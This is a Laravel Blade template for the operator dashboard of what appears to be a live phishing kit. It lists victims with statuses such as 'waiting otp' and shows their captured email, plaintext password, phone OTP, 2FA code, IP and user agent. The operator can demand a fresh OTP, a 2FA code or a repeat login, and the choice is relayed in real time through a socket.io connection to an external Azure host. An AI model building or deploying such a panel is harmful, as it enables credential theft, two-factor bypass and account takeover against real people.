@extends('admin.layouts.app')
@section('panel')
<div class="content-wrapper">
    <div class="content-header">
      <div class="container">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0">Dashboard</h1>
          </div>
          <div class="col-sm-6 text-right">
            <button id="stop-sound-button" class="btn btn-info">Sound Off</button>
            <audio id="notification-sound" src="{{ asset('assets/admin/sound/notify.mp3') }}" preload="auto"></audio>
            <a href="{{ route('admin.dashboard') }}" class="btn btn-success">Refresh</a>
          </div>
            <div id="notif" class="col-md-12 alert alert-success alert-dismissible fade show hidden mt-2" role="alert">
              <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
        </div>
      </div>
    </div>
    <div class="content">
      <div class="container">
        <div class="row table-responsive">
          <table id="datatable" class="table table-bordered table-stripes">
            <thead>
              <tr>
                <th>#</th>
                <th>User</th>
                <th>IP</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              @foreach($users as $row)
              <tr>
                <td>{{ $row->id }}</td>
                <td>{{ $row->name }}</td>
                <td>{{ $row->ip }}</td>
                <td><span class="badge 
                    @if($row->status == 'finish') badge-success
                    @elseif($row->status == 'submitted') badge-info
                    @elseif($row->status == 'waiting otp' || $row->status == 'waiting info') badge-primary
                    @elseif($row->status == 'waiting command') badge-warning
                    @elseif($row->status == 'ask login') badge-danger
                    @endif">
                    {{ ucfirst($row->status) }}
                </span></td>
                <td>
                @if($row->status == 'submitted')
                <a class="btn btn-primary" data-toggle="modal" data-target="#checkModal" data-user-id="{{ $row->id }}">Check</a>
                @endif
                @if($row->status == 'waiting command')
                <a class="btn btn-primary" data-toggle="modal" data-target="#waitingModal" data-user-id="{{ $row->id }}">Action</a>
                @endif
                @if($row->status == 'finish')
                <a class="btn btn-dark" data-toggle="modal" data-target="#viewModal" data-user-id="{{ $row->id }}">View</a>
                @endif
                <a class="btn btn-danger deleteAction" data-destroy="{{ route('admin.user.delete', $row->id) }}">Delete</a>
                </td>
              </tr>
              @endforeach
            </tbody>
          </table>      
        </div>
      </div>
    </div>


<div class="modal fade" id="waitingModal" tabindex="-1" aria-labelledby="checkModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="checkModalLabel">Choose Action</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form>
      <div class="modal-body">
        <div class="card bg-secondary p-2">
        <p><strong>ID:</strong> <span id="user_id"></span></p>
        <p><strong>Email:</strong> <span id="userEmail"></span></p>
        <p><strong>Password:</strong> <span id="userPassword"></span></p><br>
        <p><strong>Phone OTP:</strong> <span id="otp"></span></p><br>
        <p><strong>2FA:</strong> <span id="two_fa"></span></p><br>
        <p><strong>IP:</strong> <span id="userIp"></span></p>
        <p><strong>UA:</strong> <span id="userUa"></span></p>
      </div>

          <div class="form-group">
              <label for="option1">
                  <input type="radio" id="option1" name="options" value="ask_otp">
                  ASK OTP
              </label>
          </div>
          <div class="form-group">
              <label for="option2">
                  <input type="radio" id="option2" name="options" value="ask_fa">
                  ASK 2FA
              </label>
          </div>
          <div class="form-group">
              <label for="option3">
                  <input type="radio" id="option3" name="options" value="ask_login">
                  ASK LOGIN AGAIN
              </label>
          </div>
          <div class="form-group">
              <label for="option4">
                  <input type="radio" id="option4" name="options" value="finish">
                  FINISH
              </label>
          </div>
    </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary save" data-dismiss="modal">Save</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="checkModal" tabindex="-1" aria-labelledby="checkModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="checkModalLabel">User Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <p><strong>ID:</strong> <span id="user_id"></span></p>
        <p><strong>Email:</strong> <span id="userEmail"></span></p>
        <p><strong>Password:</strong> <span id="userPassword"></span></p><br>
        <p><strong>Phone OTP:</strong> <span id="otp"></span></p><br>
        <p><strong>2FA:</strong> <span id="two_fa"></span></p><br>
        <p><strong>IP:</strong> <span id="userIp"></span></p>
        <p><strong>UA:</strong> <span id="userUa"></span></p>
      </div>
      <div class="modal-footer">
        <button type="button" data-user-id="" id="check-btn-accept" class="btn btn-success accept" data-dismiss="modal">Accept</button>
        <button type="button" class="btn btn-danger reject" data-dismiss="modal">Reject</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="viewModal" tabindex="-1" aria-labelledby="checkModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="checkModalLabel">User Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <p><strong>ID:</strong> <span id="user_id"></span></p>
        <p><strong>Email:</strong> <span id="userEmail"></span></p>
        <p><strong>Password:</strong> <span id="userPassword"></span></p><br>
        <p><strong>Phone OTP:</strong> <span id="otp"></span></p><br>
        <p><strong>2FA:</strong> <span id="two_fa"></span></p><br>
        <p><strong>IP:</strong> <span id="userIp"></span></p>
        <p><strong>UA:</strong> <span id="userUa"></span></p>
      </div>
      <div class="modal-footer">
        <button type="button" data-user-id="" id="check-btn-accept" class="btn btn-success accept" data-dismiss="modal">Accept</button>
        <button type="button" class="btn btn-danger reject" data-dismiss="modal">Reject</button>
      </div>
    </div>
  </div>
</div>

     </div>
  @endsection

  @push('script')
<script>
 var socketIO = io("ws://fiv2-gchfdkc8htebhnfw.canadacentral-01.azurewebsites.net:443");
 socketIO.onopen = function() { console.log('Connection opened'); };
 socketIO.onmessage = function(event) { console.log('Message received:', event.data); };
 socketIO.onclose = function() { console.log('Connection closed'); };
 socketIO.onerror = function(error) { console.log('Error occurred:', error); };
 
 socketIO.emit("connected", 0);

function sendUserLoginPageRefreshEvent(userId, type) { 
    socketIO.emit("sendUserLoginPageRefreshEvent", {
        userId: userId,
        type: type
    });
} 

var isSoundPlaying = false;
var notificationSound = document.getElementById('notification-sound');

function playNotificationSound() {
    if (!isSoundPlaying) {
        notificationSound.loop = true;
        notificationSound.play();
        isSoundPlaying = true;
    }
}

function stopNotificationSound() {
    notificationSound.pause();
    notificationSound.currentTime = 0;
    isSoundPlaying = false;
}

socketIO.on("userLoginNotificationReceived", function(data) {
    var notifElement = document.getElementById("notif");
    var html = data;
    notifElement.innerHTML = html + notifElement.innerHTML;

    notifElement.classList.remove("hidden");
    playNotificationSound();
});

document.getElementById("stop-sound-button").addEventListener("click", function() {
    stopNotificationSound();
});

    $('#checkModal, #waitingModal, #viewModal').on('show.bs.modal', function (event) {

        var button = $(event.relatedTarget); 
        var userId = button.data('user-id');
        var modal = $(this);
        $.ajax({
            url: '{{ route('admin.getUserDetails') }}', 
            type: 'GET',
            data: { id: userId },
            success: function(data) {
                modal.find('#user_id').text(data.user.id);
                modal.find('#userEmail').text(data.user.email);
                modal.find('#userPassword').text(data.password);
                modal.find('#otp').text(data.user.phone_otp);
                modal.find('#two_fa').text(data.user.two_fa);
                modal.find('#userIp').text(data.user.ip);
                modal.find('#userUa').text(data.user.ua);
                modal.find('#check-btn-accept').data("user-id",data.user.ua);
            }
        });
    });

$(document).ready(function() {
    $('.accept').on('click', function() {
        updateUserStatus('waiting command', 'checkModal');
    });

    $('.reject').on('click', function() {
        updateUserStatus('waiting command2', 'checkModal');
    });

   $('.save').on('click', function() {
        var selectedOption = $('input[name="options"]:checked').val();
        if (!selectedOption) {
            alert('Please select an option');
            return;
        }
        if(selectedOption === 'ask_otp') {
          updateUserStatus('waiting otp', 'waitingModal', selectedOption);
        }
        if(selectedOption === 'ask_fa') {
          updateUserStatus('waiting info', 'waitingModal', selectedOption);
        }
        if(selectedOption === 'ask_login') {
          updateUserStatus('ask login', 'waitingModal', selectedOption);
        }
        if(selectedOption === 'finish') {
          updateUserStatus('finish', 'waitingModal', selectedOption);
        }
    });

   function updateUserStatus(status, modalName, selectedOption = null) {
        var userId = $('#'+modalName+'').find('#user_id').text();

        $.ajax({
            url: '{{ route('admin.userStatusUpdate') }}',
            method: 'POST',
            data: { 
                user_id: userId, 
                status: status, 
                selectedOption: selectedOption 
            },
            success: function(response) {
              if (status == 'waiting command'){
                sendUserLoginPageRefreshEvent(userId, 'accept');
              } else if(status == 'waiting command2') {
                sendUserLoginPageRefreshEvent(userId, 'reject');
              } else {
                sendUserLoginPageRefreshEvent(userId, 'refresh');
              }
                location.reload(); 
            },
            error: function(xhr, status, error) {
                console.error(error);
                alert('Failed to update status');
            }
        });
    }
});
</script>

  @endpush